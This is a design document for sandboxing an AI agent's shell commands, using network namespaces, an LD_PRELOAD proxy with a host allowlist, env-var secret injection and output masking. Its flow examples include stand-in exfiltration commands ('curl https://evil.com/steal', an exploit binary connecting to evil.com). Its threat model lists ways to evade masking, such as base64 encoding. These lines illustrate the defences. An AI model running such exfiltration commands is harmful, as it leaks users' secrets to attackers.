# Shell Networking: LD_PRELOAD + UDS Proxy

## Design Summary

Shell children are network-isolated via `CLONE_NEWNET` (hard backstop) and given controlled outbound access through an `LD_PRELOAD` shared library that routes connections through a Unix domain socket to a proxy thread in the agent process.

Secrets are injected via environment variables (`CCLAW_SECRET_<NAME>`), never interpolated into command strings. Output is masked before storage.

## Security Layers

| Layer | Mechanism | Kernel-enforced? |
|-------|-----------|-----------------|
| Network kill | `CLONE_NEWNET` — no interfaces, no routes | Yes |
| Controlled egress | `LD_PRELOAD=libcclaw_net.so` → UDS → proxy | No (app-level) |
| Filesystem | `CLONE_NEWNS` — `/` ro, workspace rw | Yes |
| Env stripping | Unset CCLAW_*, API keys before exec | No (app-level) |
| Secret injection | `CCLAW_SECRET_*` env vars (selective) | No (app-level) |
| Output masking | Replace secret values with `[REDACTED]` | No (app-level) |
| Allowlist | Proxy checks `allowed_hosts` before connect | No (app-level) |

Key insight: `CLONE_NEWNET` is the hard boundary. Everything else is convenience/defense-in-depth. A static binary that bypasses LD_PRELOAD gets zero network, not unrestricted network.

## Architecture

```
┌─────────────────────────────────────────────────────────┐
│ Agent Process (host netns)                              │
│                                                         │
│  ┌─────────────┐     ┌──────────────────────────────┐  │
│  │ Agent loop  │     │ Proxy thread                  │  │
│  │ (LLM, tools)│     │ - listens on .proxy.sock     │  │
│  └──────┬──────┘     │ - reads preamble (host:port) │  │
│         │            │ - checks allowed_hosts        │  │
│         │ fork       │ - resolves DNS                │  │
│         ▼            │ - opens real TCP, relays      │  │
│  ┌─────────────┐     └──────────────┬───────────────┘  │
│  │ Shell child │                    │                   │
│  │ (new netns) │◄── UDS ──────────►│                   │
│  │             │  (.proxy.sock      │                   │
│  │ LD_PRELOAD  │   in workspace)    │                   │
│  │ intercepts  │                    │                   │
│  │ connect()   │                    │                   │
│  └─────────────┘                    │                   │
│                                     │ libcurl           │
│                                     ▼                   │
│                              ┌─────────────┐            │
│                              │ Real network│            │
│                              │ (host netns)│            │
│                              └─────────────┘            │
└─────────────────────────────────────────────────────────┘
```

## Connection Flow

```
shell: curl https://api.github.com/repos
  1. curl calls connect("api.github.com", 443)
  2. libcclaw_net.so intercepts connect()
  3. lib opens UDS to <workspace>/.proxy.sock
  4. lib sends preamble: "api.github.com:443\n"
  5. proxy reads preamble, checks allowed_hosts → allowed
  6. proxy resolves api.github.com, opens real TCP:443
  7. proxy relays bytes bidirectionally (TLS passthrough)
  8. curl does TLS handshake directly with api.github.com
  9. curl sends request with $CCLAW_SECRET_GITHUB_TOKEN from env
  10. response flows back through proxy → UDS → curl

shell: curl https://evil.com/steal
  1. curl calls connect("evil.com", 443)
  2. libcclaw_net.so intercepts, opens UDS, sends "evil.com:443\n"
  3. proxy checks allowed_hosts → NOT listed
  4. proxy closes UDS (connection refused)
  5. curl gets ECONNREFUSED

static-binary: ./exploit --connect evil.com
  1. binary calls raw syscall connect() — bypasses LD_PRELOAD
  2. kernel: CLONE_NEWNET — no interfaces, no routes
  3. connect() returns ENETUNREACH
  4. binary gets nothing
```

## libcclaw_net.so

Minimal shared library (~200 LOC). Intercepts:

- `connect()` — if AF_INET/AF_INET6 TCP, route through UDS; else passthrough (AF_UNIX, UDP)
- `getaddrinfo()` — forward through UDS for proxy-side resolution (optional; can also just let the connect preamble carry the hostname)

Protocol over UDS:
```
Client → Proxy: "<host>:<port>\n"        (text preamble, max 256 bytes)
Proxy → Client: "OK\n"                   (connection established)
         or     "DENIED\n"               (host not in allowlist)
         or     "ERROR <msg>\n"          (DNS failure, connect timeout, etc.)
[bidirectional byte relay after OK]
```

Build: `gcc -shared -fPIC -o libcclaw_net.so src/preload_net.c`
Install: alongside agent binary or in workspace.

## Secret Injection Model

```
cclaw.db (encrypted)
  │ decrypt at fork
  ▼
agent env: CCLAW_SECRET_GITHUB_TOKEN=ghp_abc123
  │ agent reads, stores in memory, unsets from env
  │ on shell_exec: selectively re-injects needed secrets
  ▼
shell child env: CCLAW_SECRET_GITHUB_TOKEN=ghp_abc123
  │ LLM wrote: curl -H "Authorization: Bearer $CCLAW_SECRET_GITHUB_TOKEN" ...
  │ shell expands var at runtime
  │ command string in DB only contains "$CCLAW_SECRET_GITHUB_TOKEN" (safe)
  ▼
shell output: "HTTP/1.1 200 OK..."
  │ tool_result_postprocess() (single masking chokepoint, in the parent)
  │ deinterpolate: known values (raw+base64+url) → {{SECRET:github_token}}
  │ then AC scan for unknown signature-matching secrets
  ▼
entries table: masked output stored
```

LLM is told: "You have these secrets available as env vars: `$CCLAW_SECRET_GITHUB_TOKEN`, `$CCLAW_SECRET_NPM_TOKEN`. Use them in shell commands by referencing the variable name. Never write the actual value."

## Threat Model

| Threat | Mitigation |
|--------|-----------|
| Shell leaks secret via `echo $SECRET` | Output masking catches it |
| Shell exfiltrates to attacker host | Proxy denies unlisted hosts |
| Shell bypasses LD_PRELOAD (static binary) | CLONE_NEWNET — zero network |
| LLM puts secret value in command string | Future: command safety gate (pattern check) |
| LLM encodes secret (base64) to evade masking | Partial: mask common encodings; accepted risk |
| Shell reads filesystem secrets | CLONE_NEWNS — `/` ro, workspace has no secrets |
| Prompt injection extracts secret | LLM only knows names, not values; output masked |

### Accepted Risks

| Risk | Rationale |
|------|-----------|
| LD_PRELOAD bypassable by static binaries | CLONE_NEWNET catches them (zero network) |
| Base64-encoded secrets evade masking | Low probability; allowed_hosts limits damage |
| Shell child has secret in env memory | Ephemeral process; same as any CLI tool using env vars |
| Proxy sees all traffic in plaintext (TLS passthrough) | Proxy only sees encrypted bytes; no MITM |

## Comparison: Previous Design (iptables REDIRECT) vs Current (LD_PRELOAD + UDS)

| Aspect | iptables REDIRECT | LD_PRELOAD + UDS |
|--------|------------------|-----------------|
| Cross-netns connectivity | Requires veth pair (needs host CAP_NET_ADMIN) | UDS via filesystem (works unprivileged) |
| Kernel requirement | iptables-legacy + ip_tables module | Just CLONE_NEWNET (standard) |
| Credential injection | MITM CA + TLS interception | Env vars (no MITM needed) |
| DNS handling | UDP 53 redirect + proxy resolver | getaddrinfo() intercept or preamble hostname |
| Static binary behavior | Redirected to proxy (still gets network) | Zero network (CLONE_NEWNET blocks) |
| Complexity | High (veth, iptables, MITM CA, SO_ORIGINAL_DST) | Low (~200 LOC preload lib + UDS proxy) |
| Pogoplug/ARMv5 compat | Needs iptables-legacy binary | Just needs LD_PRELOAD support (universal) |

## Implementation Tasks

- **T210**: `libcclaw_net.so` — LD_PRELOAD shared lib
- **T211**: Proxy thread — UDS listener in agent process
- **T212**: Secret env-var injection for shell children
- **T214**: Output secret masking
- **T215-T217**: Integration tests

## Non-Goals

- No TLS interception / MITM CA (secrets via env vars instead)
- No credential_mappings table (secrets are env vars, not proxy-injected headers)
- No iptables / netfilter rules
- No veth pairs or cross-namespace network plumbing
